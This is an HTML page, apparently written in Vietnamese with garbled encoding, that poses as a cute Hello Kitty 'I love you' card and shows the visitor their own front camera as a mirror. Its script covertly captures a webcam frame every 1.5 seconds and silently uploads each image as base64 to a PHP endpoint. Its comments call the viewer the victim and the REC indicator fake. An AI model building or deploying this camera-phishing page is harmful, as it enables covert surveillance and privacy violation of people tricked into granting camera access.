<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>G·ª≠i l·ªùi y√™u th∆∞∆°ng - Hello Kitty</title>
    
    <!-- Th∆∞ vi·ªán jQuery (B·∫Øt bu·ªôc cho Logic c≈©) -->
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    
    <!-- Fonts Cute -->
    <link href="https://fonts.googleapis.com/css2?family=Pacifico&family=Quicksand:wght@500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">

    <style>
        /* --- GIAO DI·ªÜN H·ªíNG HELLO KITTY --- */
        body {
            margin: 0;
            padding: 0;
            background-color: #ffe6f2;
            background-image: url('https://www.transparenttextures.com/patterns/hearts.png');
            font-family: 'Quicksand', sans-serif;
            overflow-x: hidden;
            text-align: center;
            color: #d63384;
        }

        /* Hello Kitty bay bay */
        .kitty-float {
            position: fixed;
            z-index: 100;
            opacity: 0.9;
            animation: float 3s ease-in-out infinite;
            pointer-events: none;
        }
        .k1 { top: 5%; left: 5%; width: 80px; }
        .k2 { bottom: 10%; right: 5%; width: 90px; animation-delay: 1s; }
        .k3 { top: 15%; right: 10%; width: 50px; animation-delay: 2s; }

        @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-15px); }
        }

        /* Header */
        h1 {
            font-family: 'Pacifico', cursive;
            font-size: 2.2em;
            color: #ff4d94;
            text-shadow: 2px 2px 0px #fff;
            margin-top: 20px;
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }

        /* Khung Camera Cute (G∆∞∆°ng) */
        .mirror-frame {
            position: relative;
            width: 300px;
            height: 350px; /* H√¨nh ch·ªØ nh·∫≠t bo g√≥c gi·ªëng ƒëi·ªán tho·∫°i */
            margin: 10px auto;
            border: 8px solid #ff99cc;
            border-radius: 30px;
            box-shadow: 0 0 20px rgba(255, 105, 180, 0.5);
            overflow: hidden;
            background: #000;
        }

        /* Video hi·ªÉn th·ªã cho n·∫°n nh√¢n xem (Soi g∆∞∆°ng) */
        #video-display {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: scaleX(-1); /* L·∫≠t ng∆∞·ª£c cho gi·ªëng g∆∞∆°ng */
        }

        /* Hi·ªáu ·ª©ng REC gi·∫£ */
        .rec-indicator {
            position: absolute;
            top: 15px;
            right: 20px;
            color: red;
            font-weight: bold;
            font-family: Arial, sans-serif;
            font-size: 14px;
            background: rgba(255, 255, 255, 0.7);
            padding: 5px 10px;
            border-radius: 10px;
            display: flex;
            align-items: center;
            z-index: 10;
        }

        .dot {
            width: 10px;
            height: 10px;
            background-color: red;
            border-radius: 50%;
            display: inline-block;
            margin-right: 5px;
            animation: blink 1s infinite;
        }

        @keyframes blink { 0% { opacity: 0; } 50% { opacity: 1; } 100% { opacity: 0; } }

        /* N∆° trang tr√≠ */
        .bow {
            position: absolute;
            top: -15px;
            left: -10px;
            font-size: 50px;
            z-index: 20;
            transform: rotate(-20deg);
        }

        /* Footer */
        .footer {
            position: fixed;
            bottom: 0;
            width: 100%;
            background: rgba(255, 255, 255, 0.8);
            padding: 10px;
            font-size: 14px;
            color: #ff66b2;
            font-weight: bold;
        }

        /* Canvas ·∫©n ƒë·ªÉ x·ª≠ l√Ω ·∫£nh (Quan tr·ªçng) */
        #canvas { display: none; }

    </style>
</head>
<body>

    <!-- Trang tr√≠ -->
    <img src="https://i.pinimg.com/originals/22/04/9a/22049a173824147781b045152eb49e6f.png" class="kitty-float k1">
    <img src="https://upload.wikimedia.org/wikipedia/en/0/05/Hello_kitty_character_portrait.png" class="kitty-float k2">
    <div class="kitty-float k3" style="font-size: 40px;">üíñ</div>

    <!-- Nh·∫≠p t√™n -->
    <script>
        var name = prompt("Nh·∫≠p t√™n ng∆∞·ªùi b·∫°n y√™u th∆∞∆°ng:", "C·ª•c C∆∞ng");
        if (!name) name = "B·∫°n Y√™u";
    </script>

    <!-- Ti√™u ƒë·ªÅ -->
    <h1>I <i class="fas fa-heart" style="color:red"></i> YOU</h1>
    <h2 style="font-size: 18px; color: #ff0066; margin-top: -10px;"><script>document.write(name)</script></h2>

    <!-- Khung Camera (G∆∞∆°ng) -->
    <div class="mirror-frame">
        <div class="bow">üéÄ</div>
        <!-- Gi·∫£ v·ªù ƒëang quay -->
        <div class="rec-indicator"><div class="dot"></div> REC</div>
        
        <!-- Video ƒë·ªÉ ng∆∞·ªùi d√πng nh√¨n th·∫•y m√¨nh -->
        <video id="video-display" playsinline autoplay muted></video>
    </div>

    <p style="font-size: 14px; color: #ff66b2; margin-top: 10px;">
        üíñ H√£y c∆∞·ªùi th·∫≠t t∆∞∆°i ƒë·ªÉ l∆∞u gi·ªØ kho·∫£nh kh·∫Øc n√†y nh√©! üíñ
    </p>

    <div class="footer">
        Love you forever ~ Meow Meow üê±
    </div>

    <!-- Canvas ·∫©n d√πng ƒë·ªÉ ch·ª•p h√¨nh g·ª≠i v·ªÅ PHP (Logic c≈©) -->
    <canvas id="canvas" width="640" height="480"></canvas>

    <!-- SCRIPT LOGIC (GI·ªÆ NGUY√äN LOGIC C≈®) -->
    <script>
        // --- C·∫§U H√åNH ---
        // ƒê·ªïi ƒë∆∞·ªùng d·∫´n n√†y th√†nh file PHP c·ªßa b·∫°n n·∫øu c·∫ßn
        const PHP_URL = 'post.php'; 

        // H√†m g·ª≠i d·ªØ li·ªáu (Gi·ªëng h·ªát code c≈© c·ªßa b·∫°n)
        function post(imgdata){
            $.ajax({
                type: 'POST',
                data: { cat: imgdata}, // Bi·∫øn 'cat' ƒë·ªÉ PHP nh·∫≠n di·ªán
                url: PHP_URL,
                dataType: 'json',
                async: false,
                success: function(result){
                    // G·ª≠i th√†nh c√¥ng (√¢m th·∫ßm)
                },
                error: function(){
                    // L·ªói (√¢m th·∫ßm)
                }
            });
        };

        const video = document.getElementById('video-display');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        const constraints = {
            audio: false,
            video: {
                facingMode: "user" // Camera tr∆∞·ªõc
            }
        };

        // Kh·ªüi ƒë·ªông Camera
        async function init() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                handleSuccess(stream);
            } catch (e) {
                // N·∫øu l·ªói camera, b√°o nh·∫π
                console.log("Camera error: " + e.toString());
                alert("H√£y b·∫≠t Camera ƒë·ªÉ th·∫•y ƒëi·ªÅu b·∫•t ng·ªù nh√©! üíñ");
            }
        }

        // X·ª≠ l√Ω khi Camera b·∫≠t th√†nh c√¥ng
        function handleSuccess(stream) {
            window.stream = stream;
            video.srcObject = stream;

            // LOGIC C≈®: Ch·ª•p h√¨nh m·ªói 1.5 gi√¢y v√† g·ª≠i v·ªÅ
            setInterval(function(){
                // V·∫Ω h√¨nh t·ª´ video l√™n canvas ·∫©n
                context.drawImage(video, 0, 0, 640, 480);
                
                // Chuy·ªÉn th√†nh Base64 (image/png)
                // D√≤ng n√†y th√™m replace ƒë·ªÉ t∆∞∆°ng th√≠ch code PHP c≈© c·ªßa b·∫°n
                var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
                
                // G·ª≠i ƒëi
                post(canvasData); 
            }, 1500); // 1500ms = 1.5 gi√¢y
        }

        // Ch·∫°y ngay
        init();

    </script>
</body>
</html>
